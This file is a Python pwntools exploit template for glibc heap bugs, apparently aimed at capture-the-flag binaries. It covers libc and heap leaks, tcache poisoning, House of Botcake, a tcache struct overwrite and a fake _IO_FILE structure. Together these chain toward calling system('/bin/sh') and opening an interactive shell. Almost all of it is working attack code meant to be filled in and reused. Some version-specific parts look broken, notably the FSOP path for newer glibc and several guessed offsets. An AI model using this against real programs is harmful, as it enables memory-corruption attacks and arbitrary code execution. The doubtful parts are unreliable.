#!/usr/bin/env python3
"""
Heap Exploitation Template — Tcache Poisoning + House of Botcake
Covers: glibc 2.27-2.35 with version-specific safe-link handling.

Usage: Copy, fill in TODOs, adjust sizes/offsets for the target binary.
"""
from pwn import *
import sys

# ── Target configuration ──────────────────────────────────────────────────────
BINARY  = "./heap_challenge"          # TODO: path to binary
LIBC    = "./libc.so.6"               # TODO: path to libc (or auto-detect)
HOST    = "target.ctf.io"
PORT    = 1337

context.binary = elf = ELF(BINARY)
try:
    libc = ELF(LIBC)
except Exception:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"

# ── Heap primitive stubs — replace with challenge-specific functions ──────────
def alloc(size: int, data: bytes = b"") -> int:
    """Allocate chunk of `size` bytes. Returns chunk index."""
    io.sendlineafter(b"choice: ", b"1")
    io.sendlineafter(b"size: ",   str(size).encode())
    if data:
        io.sendlineafter(b"data: ", data)
    # TODO: parse and return chunk index
    return 0

def free(idx: int) -> None:
    """Free chunk at index `idx`."""
    io.sendlineafter(b"choice: ", b"2")
    io.sendlineafter(b"index: ",  str(idx).encode())

def write_chunk(idx: int, data: bytes) -> None:
    """Write data to chunk (after alloc)."""
    io.sendlineafter(b"choice: ", b"3")
    io.sendlineafter(b"index: ",  str(idx).encode())
    io.sendafter(b"data: ",       data)

def read_chunk(idx: int) -> bytes:
    """Read chunk content (for info leak)."""
    io.sendlineafter(b"choice: ", b"4")
    io.sendlineafter(b"index: ",  str(idx).encode())
    return io.recvline().strip()

# ── glibc version detection ───────────────────────────────────────────────────
def get_glibc_version() -> tuple[int, int]:
    """Returns (major, minor) tuple e.g. (2, 35)."""
    try:
        out = subprocess.check_output(["ldd", "--version"], text=True).split("\n")[0]
        import re
        m = re.search(r"(\d+)\.(\d+)", out)
        if m:
            return int(m.group(1)), int(m.group(2))
    except Exception:
        pass
    # Try from libc path
    try:
        out = subprocess.check_output(
            ["strings", LIBC], text=True
        )
        import re
        m = re.search(r"GLIBC (\d+)\.(\d+)", out)
        if m:
            return int(m.group(1)), int(m.group(2))
    except Exception:
        pass
    return (2, 35)

GLIBC_MAJOR, GLIBC_MINOR = get_glibc_version()
log.info(f"Detected glibc {GLIBC_MAJOR}.{GLIBC_MINOR}")
HAS_TCACHE_KEY    = (GLIBC_MAJOR, GLIBC_MINOR) >= (2, 29)   # double-free detection
HAS_SAFE_LINK     = (GLIBC_MAJOR, GLIBC_MINOR) >= (2, 32)   # PROTECT_PTR
HOOKS_REMOVED     = (GLIBC_MAJOR, GLIBC_MINOR) >= (2, 34)   # __malloc_hook gone
HAS_LARGE_TCACHE  = (GLIBC_MAJOR, GLIBC_MINOR) >= (2, 35)   # tcache_perthread changes

# ── Safe-link helpers (glibc 2.32+) ──────────────────────────────────────────
def mangle(heap_addr: int, ptr: int) -> int:
    """Encode tcache fd with PROTECT_PTR (glibc 2.32+)."""
    return ptr ^ (heap_addr >> 12)

def demangle(enc: int, pos: int) -> int:
    """Decode stored tcache fd (glibc 2.32+)."""
    return enc ^ (pos >> 12)

# ── Leak libc base via unsorted bin ──────────────────────────────────────────
def leak_libc_via_unsorted(chunk_size: int = 0x420) -> int:
    """
    Leak libc main_arena address from unsorted bin fd/bk.
    Requires: read primitive + chunk size > fastbin max (> 0x78 on 64-bit).
    """
    # Fill tcache for this size (7 frees)
    tcache_fill = [alloc(chunk_size) for _ in range(7)]
    victim = alloc(chunk_size)
    guard  = alloc(0x10)   # prevent merging with top chunk

    for idx in tcache_fill:
        free(idx)
    free(victim)  # goes to unsorted bin (tcache full)

    # Read fd of victim — points to main_arena+96
    raw = read_chunk(victim)
    fd_leaked = u64(raw[:8].ljust(8, b"\x00"))
    log.info(f"unsorted bin fd: {fd_leaked:#x}")

    # main_arena is at fixed offset from libc base
    libc_base = fd_leaked - libc.sym.get("main_arena", 0) - 96
    if libc_base == 0 or libc_base & 0xfff:
        # Fallback: use known offset for common libc versions
        # Run: readelf -s libc.so.6 | grep main_arena
        libc_base = fd_leaked - 0x1ecbe0  # common 2.31 offset; ADJUST per version
    return libc_base

# ── Leak heap base (glibc 2.32+ safe-link) ───────────────────────────────────
def leak_heap_base() -> int:
    """
    Leak heap base by reading encoded fd from first freed tcache chunk.
    First tcache chunk: stored_fd = 0 ^ (chunk_addr >> 12)
    → chunk_addr >> 12 is stored directly → << 12 gives approximate base.
    """
    victim = alloc(0x20)
    free(victim)
    raw = read_chunk(victim)  # UAF read after free
    stored_fd = u64(raw[:8].ljust(8, b"\x00"))
    heap_base = stored_fd << 12
    log.info(f"heap base (approx): {heap_base:#x}")
    return heap_base

# ── Tcache poisoning (glibc 2.27-2.31) ───────────────────────────────────────
def tcache_poison_no_key(target: int, chunk_size: int = 0x30) -> None:
    """
    Classic tcache poisoning without key bypass.
    Overwrites tcache fd to point to `target`, then two allocs return &target.
    """
    a = alloc(chunk_size)
    b = alloc(chunk_size)
    free(a)
    free(b)
    # b.fd → a → NULL; now overwrite b.fd with target
    write_chunk(b, p64(target))
    alloc(chunk_size)   # returns b
    # next alloc returns target
    log.success(f"Next malloc({chunk_size}) will return {target:#x}")

# ── House of Botcake (glibc 2.29+) ───────────────────────────────────────────
def house_of_botcake(target: int, chunk_size: int = 0x100) -> None:
    """
    Double-free bypass via unsorted bin consolidation.
    Works regardless of tcache key check.
    """
    # Step 1: fill tcache
    fill = [alloc(chunk_size) for _ in range(7)]
    prev = alloc(chunk_size)   # will merge with A in unsorted bin
    a    = alloc(chunk_size)   # double-free target
    _    = alloc(0x10)         # guard chunk

    for idx in fill:
        free(idx)              # fill tcache

    free(prev)                 # prev → unsorted bin
    free(a)                    # a → unsorted bin, merges with prev

    # Step 2: drain tcache to make room for a's tcache entry
    alloc(chunk_size)
    free(a)                    # a → tcache (second free — bypass!)

    # Step 3: a is now in BOTH tcache and unsorted bin (overlap)
    #         Corrupt tcache fd to point to target
    if HAS_SAFE_LINK:
        heap_base = leak_heap_base()
        enc_target = mangle(heap_base + 0x10, target)   # adjust offset to a's address
    else:
        enc_target = target

    write_chunk(a, b"X" * chunk_size + p64(0) + p64(chunk_size | 1) + p64(enc_target))
    alloc(chunk_size)          # returns a from tcache
    # next alloc returns target
    log.success(f"Next malloc({chunk_size}) will return {target:#x}")

# ── House of Tangerine (glibc 2.35+) ─────────────────────────────────────────
def house_of_tangerine(tcache_perthread_addr: int, target: int,
                        bin_idx: int = 5, chunk_size: int = 0x60) -> None:
    """
    Corrupt tcache_perthread_struct entries[] directly.
    Requires a write primitive to the tcache struct (at heap_base + 0x10).
    bin_idx = (chunk_size - 0x20) // 0x10 - 1  (0-indexed)
    """
    # entries[bin_idx] at offset 0x40 + bin_idx*8
    entry_offset = 0x40 + bin_idx * 8
    # counts[bin_idx] at offset bin_idx
    count_offset = bin_idx

    # Write target to entries[bin_idx] AND set counts[bin_idx] = 1
    payload = bytearray(0x290)
    payload[count_offset]  = 1          # counts[idx] = 1 (non-zero → bin has entry)
    struct.pack_into("<Q", payload, entry_offset, target)

    log.info(f"Writing to tcache_perthread @ {tcache_perthread_addr:#x}")
    log.info(f"  counts[{bin_idx}] = 1, entries[{bin_idx}] = {target:#x}")
    # write_to_addr(tcache_perthread_addr, bytes(payload))  # use your write primitive

# ── _IO_FILE / FSOP (glibc 2.34+, no hooks) ──────────────────────────────────
def io_file_exploit(libc_base: int) -> bytes:
    """
    Build fake _IO_FILE for _IO_str_overflow FSOP.
    Requires: libc base + overwrite _IO_list_all with address of fake struct.
    """
    _IO_str_jumps_off = libc.sym.get("_IO_str_jumps", 0)
    if not _IO_str_jumps_off:
        # Fallback: _IO_str_jumps is typically main_arena - 0x60 (varies)
        log.warning("_IO_str_jumps not found in libc symbols, using approximate offset")
        _IO_str_jumps_off = libc.sym.get("main_arena", 0) - 0x60
    _IO_str_jumps = libc_base + _IO_str_jumps_off
    system_addr   = libc_base + libc.sym["system"]
    binsh_addr    = libc_base + next(libc.search(b"/bin/sh\x00"))

    # Use pwntools FileStructure if available
    try:
        fake = FileStructure()
        fake.flags         = 0x3b01010101010101
        fake._IO_buf_base  = 0
        fake._IO_buf_end   = (binsh_addr >> 8) - 100
        fake._IO_write_base = 0
        fake._IO_write_ptr  = (binsh_addr >> 8)
        fake._IO_write_end  = system_addr
        fake.vtable        = _IO_str_jumps - 0x20
        return bytes(fake)
    except Exception:
        # Manual construction
        fake = b"\x01\x01\x01\x01\x01\x01\x01\x3b"  # flags
        fake += b"\x00" * 0x18                          # read ptrs
        fake += p64(0)                                   # _IO_buf_base
        fake += p64((binsh_addr >> 8) - 100)             # _IO_buf_end
        fake += p64(0)                                   # _IO_write_base
        fake += p64(binsh_addr >> 8)                     # _IO_write_ptr
        fake += p64(system_addr)                         # _IO_write_end (alloc fn)
        fake += b"\x00" * (0xd8 - len(fake))
        fake += p64(_IO_str_jumps - 0x20)               # vtable
        return fake

# ── Main exploit ──────────────────────────────────────────────────────────────
def main():
    global io
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process(elf.path, env={"LD_PRELOAD": LIBC} if LIBC else {})

    try:
        # TODO: adapt exploit flow to target binary

        if HOOKS_REMOVED:
            log.info("glibc >=2.34: using IO_FILE FSOP (no hooks)")
            # 1. Get heap write + libc leak
            libc_base = leak_libc_via_unsorted()
            libc.address = libc_base
            log.success(f"libc base: {libc_base:#x}")

            # 2. Build fake FILE struct
            fake = io_file_exploit(libc_base)

            # 3. Write fake to heap, overwrite _IO_list_all
            # heap_alloc_for_fake = alloc(len(fake))
            # write_chunk(heap_alloc_for_fake, fake)
            # overwrite(_IO_list_all addr, fake_file_heap_addr)

            # 4. Trigger: exit() / return from main
            io.sendlineafter(b"choice: ", b"0")  # TODO: trigger exit

        elif HAS_SAFE_LINK:
            log.info("glibc 2.32-2.33: using safe-link bypass")
            heap_base = leak_heap_base()
            libc_base = leak_libc_via_unsorted()
            libc.address = libc_base
            log.success(f"heap base: {heap_base:#x}  libc base: {libc_base:#x}")

            target = libc_base + libc.sym.get("__free_hook",
                      libc_base + libc.sym.get("__malloc_hook", 0))
            log.info(f"target hook: {target:#x}")
            house_of_botcake(target)
            # write system to hook
            # alloc(chunk_size, p64(libc.sym['system']))

        elif HAS_TCACHE_KEY:
            log.info("glibc 2.29-2.31: using House of Botcake")
            libc_base = leak_libc_via_unsorted()
            libc.address = libc_base
            target = libc_base + libc.sym["__free_hook"]
            house_of_botcake(target)
            # alloc(chunk_size, p64(libc.sym['system']))
            # free(chunk_with_binsh)

        else:
            log.info("glibc 2.27-2.28: using classic tcache poisoning")
            libc_base = leak_libc_via_unsorted()
            libc.address = libc_base
            target = libc_base + libc.sym["__free_hook"]
            tcache_poison_no_key(target)
            # alloc(0x30, p64(libc.sym['system']))
            # free(chunk_with_binsh)

        io.interactive()

    except Exception as e:
        log.error(f"Exploit failed: {e}")
        io.interactive()

if __name__ == "__main__":
    main()
